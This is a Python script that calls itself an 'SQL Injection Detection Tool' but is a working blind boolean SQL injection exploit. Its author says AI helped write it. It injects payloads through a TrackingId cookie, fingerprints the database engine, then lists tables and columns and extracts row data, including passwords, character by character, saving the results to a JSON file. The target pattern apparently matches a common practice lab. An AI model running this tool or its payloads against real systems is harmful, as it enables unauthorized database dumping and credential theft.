"""
hello , i'm abdarhman known as p0nther. i use AI to bulid this tool . it's take 2 hour 

SQL Injection Detection Tool - Blind/Boolean Based
Automatically detects database type and enumerates tables, columns, and data.

Usage:
    python DETECT.py --url <target_url> --tracking-id <tracking_id> --session <session_id>
    
Example:
    python DETECT.py --url "https://target.com/" --tracking-id "abc123" --session "xyz789"
"""

import requests
import json
import argparse
import time
import string
from typing import Dict, List, Optional, Tuple

class SQLInjectionDetector:
    def __init__(self, url: str, tracking_id: str, session_id: str):
        self.url = url.rstrip('/')
        self.tracking_id = tracking_id
        self.session_id = session_id
        self.results = {
            'database_type': '',
            'tables': [],
            'columns': {},
            'data': {}
        }
        
        # Database-specific payloads
        self.db_payloads = {
            "MySQL": "' AND LENGTH(database())>9 --",
    "PostgreSQL": "' AND LENGTH(current_database())>9--",
            "MS SQL Server": "' AND LEN(DB_NAME())>9--",
            "Oracle": "' AND LENGTH((SELECT name FROM v$database))>9--"
        }
        
        # Database-specific queries
        self.db_queries = {
            "MySQL": {
                "tables": "information_schema.tables WHERE table_schema = DATABASE()",
                "columns": "information_schema.columns WHERE table_name = '{}' AND table_schema = DATABASE()",
                "data": "SELECT {} FROM {}"
            },
            "PostgreSQL": {
                "tables": "information_schema.tables WHERE table_schema = current_schema()",
                "columns": "information_schema.columns WHERE table_name = '{}' AND table_schema = current_schema()",
                "data": "SELECT {} FROM {}"
            },
            "MS SQL Server": {
                "tables": "information_schema.tables WHERE table_schema = 'dbo'",
                "columns": "information_schema.columns WHERE table_name = '{}' AND table_schema = 'dbo'",
                "data": "SELECT {} FROM {}"
            },
            "Oracle": {
                "tables": "user_tables",
                "columns": "user_tab_columns WHERE table_name = '{}'",
                "data": "SELECT {} FROM {}"
            }
        }

    def make_request(self, payload: str, debug: bool = False) -> bool:
        """Make a request and check if it returns the expected response"""
        try:
            cookies = {
                "TrackingId": f"{self.tracking_id}{payload};",
                "session": self.session_id
            }
            response = requests.get(self.url, cookies=cookies, timeout=10)
            success = "Welcome back!" in response.text
            if debug:
                print(f"    Debug: Payload: {payload}")
                print(f"    Debug: Success: {success}")
            return success
        except requests.RequestException as e:
            if debug:
                print(f"    Debug: Request error: {e}")
            return False

    def detect_database_type(self) -> Optional[str]:
        """Detect the database type using blind SQL injection"""
        print("[+] Detecting database type...")
        
        for db_type, payload in self.db_payloads.items():
            print(f"    Testing {db_type}...")
            if self.make_request(payload):
                print(f"[+] Database type detected: {db_type}")
                self.results['database_type'] = db_type
                return db_type
        
        print("[-] Could not detect database type")
        return None

    def binary_search_length(self, query: str, max_length: int = 50) -> int:
        """Use binary search to find the length of a string"""
        left, right = 1, max_length
        
        while left <= right:
            mid = (left + right) // 2
            payload = f"' AND LENGTH(({query})) > {mid}--"
            
            if self.make_request(payload):
                left = mid + 1
            else:
                right = mid - 1
        
        return left

    def binary_search_number(self, query: str, max_value: int = 1000) -> int:
        """Use binary search to evaluate a numeric expression (e.g., COUNT(*))"""
        left, right = 0, max_value
        while left <= right:
            mid = (left + right) // 2
            payload = f"' AND ({query}) > {mid}--"
            if self.make_request(payload):
                left = mid + 1
            else:
                right = mid - 1
        return left

    def escape_sql_char(self, ch: str) -> str:
        """Escape a single quote for SQL literals."""
        return ch.replace("'", "''")

    def extract_char(self, query: str, position: int) -> str:
        """Extract a single character using equality comparison"""
        # Broader charset for realistic names/passwords
        charset = (
            string.ascii_lowercase + string.ascii_uppercase + string.digits +
            " _-:@./\\{}[]()!#$%^&*+=?<>|,;"
        )
        
        for char in charset:
            safe_char = self.escape_sql_char(char)
            if self.results['database_type'] == 'PostgreSQL':
                payload = f"' AND SUBSTRING(({query}), {position}, 1) = '{safe_char}'--"
            else:
                payload = f"' AND ASCII(SUBSTRING(({query}), {position}, 1)) = ASCII('{safe_char}')--"
            
            if self.make_request(payload):
                return char
        
        return ''

    def extract_string(self, query: str, max_length: int = 50) -> str:
        """Extract a complete string using character-by-character extraction"""
        length = self.binary_search_length(query, max_length)
        result = ""
        
        print(f"    Extracting string (length: {length})...")
        
        for i in range(1, length + 1):
            char = self.extract_char(query, i)
            if char:
                result += char
                print(f"\r    Extracting: {result}", end="", flush=True)
            else:
                print(f"\n    Warning: Could not extract character at position {i}")
                break
        
        print()  # New line after extraction
        return result

    def test_table_query(self, db_type: str):
        """Test the table query to debug issues"""
        print(f"[DEBUG] Testing table query for {db_type}")
        
        # Test basic query
        test_payload = f"' AND (SELECT COUNT(*) FROM {self.db_queries[db_type]['tables']}) > 0--"
        print(f"[DEBUG] Testing: {test_payload}")
        result = self.make_request(test_payload, debug=True)
        print(f"[DEBUG] Result: {result}")
        
        # Test first table name extraction
        if result:
            table_query = f"(SELECT table_name FROM {self.db_queries[db_type]['tables']} LIMIT 1 OFFSET 0)"
            test_payload2 = f"' AND LENGTH({table_query}) > 0--"
            print(f"[DEBUG] Testing length query: {test_payload2}")
            result2 = self.make_request(test_payload2, debug=True)
            print(f"[DEBUG] Length query result: {result2}")
            
            # Test length detection
            print(f"[DEBUG] Testing length detection...")
            length = self.binary_search_length(table_query, 20)
            print(f"[DEBUG] Detected length: {length}")
            
            # Test character extraction
            print(f"[DEBUG] Testing character extraction...")
            test_char = self.extract_char(table_query, 1)
            print(f"[DEBUG] First character: '{test_char}'")

    def discover_tables(self) -> List[str]:
        """Discover all tables in the database"""
        if not self.results['database_type']:
            return []
        
        print(f"[+] Discovering tables for {self.results['database_type']}...")
        tables = []
        db_type = self.results['database_type']
        
        # Debug the query first
        self.test_table_query(db_type)
        
        # Count tables (numeric)
        count_query = f"(SELECT COUNT(*) FROM {self.db_queries[db_type]['tables']})"
        table_count = self.binary_search_number(count_query, 50)
        
        print(f"    Found {table_count} tables")
        
        # Extract each table name
        for i in range(table_count):
            table_query = (
                f"(SELECT table_name FROM {self.db_queries[db_type]['tables']} "
                f"ORDER BY table_name LIMIT 1 OFFSET {i})"
            )
            table_name = self.extract_string(table_query)
            if table_name:
                tables.append(table_name)
                print(f"    Table {i+1}: {table_name}")
            else:
                print(f"    Warning: Could not extract table {i+1}")
        
        self.results['tables'] = tables
        return tables

    def discover_columns(self, table_name: str) -> List[str]:
        """Discover columns for a specific table"""
        if not self.results['database_type']:
            return []
        
        print(f"[+] Discovering columns for table '{table_name}'...")
        columns = []
        db_type = self.results['database_type']
        
        # Count columns (numeric)
        count_query = f"(SELECT COUNT(*) FROM {self.db_queries[db_type]['columns'].format(table_name)})"
        column_count = self.binary_search_number(count_query, 50)
        
        print(f"    Found {column_count} columns")
        
        # Extract each column name
        for i in range(column_count):
            column_query = (
                f"(SELECT column_name FROM {self.db_queries[db_type]['columns'].format(table_name)} "
                f"ORDER BY column_name LIMIT 1 OFFSET {i})"
            )
            column_name = self.extract_string(column_query)
            if column_name:
                columns.append(column_name)
                print(f"    Column {i+1}: {column_name}")
        
        self.results['columns'][table_name] = columns
        return columns

    def extract_table_data(self, table_name: str, columns: List[str], max_rows: int = 10) -> List[Dict]:
        """Extract data from a table"""
        if not self.results['database_type']:
            return []
        
        print(f"[+] Extracting data from table '{table_name}'...")
        data = []
        db_type = self.results['database_type']
        
        # Count rows (numeric)
        count_query = f"(SELECT COUNT(*) FROM {table_name})"
        row_count = min(self.binary_search_number(count_query, 1000), max_rows)
        
        print(f"    Found {row_count} rows (extracting up to {max_rows})")
        
        # Extract each row
        for row_idx in range(row_count):
            row_data = {}
            print(f"    Extracting row {row_idx + 1}/{row_count}")
            
            for col_idx, column in enumerate(columns):
                # Cast to text in PostgreSQL to normalize types for extraction
                if db_type == 'PostgreSQL':
                    data_query = f"(SELECT CAST({column} AS TEXT) FROM {table_name} LIMIT 1 OFFSET {row_idx})"
                else:
                    data_query = f"(SELECT {column} FROM {table_name} LIMIT 1 OFFSET {row_idx})"
                value = self.extract_string(data_query, 100)
                row_data[column] = value
                print(f"      {column}: {value}")
            
            data.append(row_data)
        
        self.results['data'][table_name] = data
        return data

    def run_full_scan(self):
        """Run complete SQL injection scan"""
        print("[+] Starting SQL Injection Detection Tool")
        print(f"[+] Target: {self.url}")
        
        # Detect database type
        if not self.detect_database_type():
            return False
        
        # Discover tables
        tables = self.discover_tables()
        if not tables:
            print("[-] No tables found")
            return False
        
        # Discover columns and extract data for each table
        for table in tables:
            columns = self.discover_columns(table)
            if columns:
                self.extract_table_data(table, columns)
        
        # Save results
        self.save_results()
        return True

    def save_results(self):
        """Save results to JSON file"""
        filename = f"sql_injection_results_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"[+] Results saved to {filename}")

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Detection Tool")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--tracking-id", required=True, help="TrackingId cookie value")
    parser.add_argument("--session", required=True, help="Session cookie value")
    
    args = parser.parse_args()
    
    detector = SQLInjectionDetector(args.url, args.tracking_id, args.session)
    detector.run_full_scan()

if __name__ == "__main__":
    main()
